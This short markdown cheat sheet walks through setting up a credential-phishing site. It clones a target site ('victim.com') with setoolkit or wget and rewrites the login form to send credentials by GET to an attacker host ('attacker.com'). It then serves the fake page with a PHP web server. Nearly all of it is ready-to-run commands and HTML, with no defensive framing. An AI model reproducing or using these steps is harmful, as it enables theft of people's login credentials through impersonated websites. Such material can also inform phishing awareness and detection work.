Use setoolkit to clone website
----------------------------
```bash
setoolkit
1, 2, 3, 2
[Enter]
https://site.toclone.com
# copy files from the ~/.set/ directory to working directory
```
Use wget to clone website
---------------------------
```bash
wget --no-check-certificate --convert-links --random-wait -r -p -E -e robots=off -U mozilla https://www.victim.com
```
Modify login page to use GET rather then POST method
----------------------------------------------------
```
Copy index.html (or equivalent) to working directory
Open index.html in text editor and search for attacking domain name or ip address or login method being used

Example 1
<form name="login" id="login_form" method="post" action="http://www.attacker.com/" autocomplete="off">
<form name="login" id="login_form" method="get" action="http://www.attacker.com/" autocomplete="off">
change "method="post" to "method="get"

Example 2
<form name="login" id="login_form" method="post" action="index.html" autocomplete="off">
<form name="login" id="login_form" method="get" action="index.html" autocomplete="off">
change "method="post" to "method="get"
```
Start attackers phishing website
--------------------------
```bash
php -S xxx.xxx.xxx.xxx:80
```
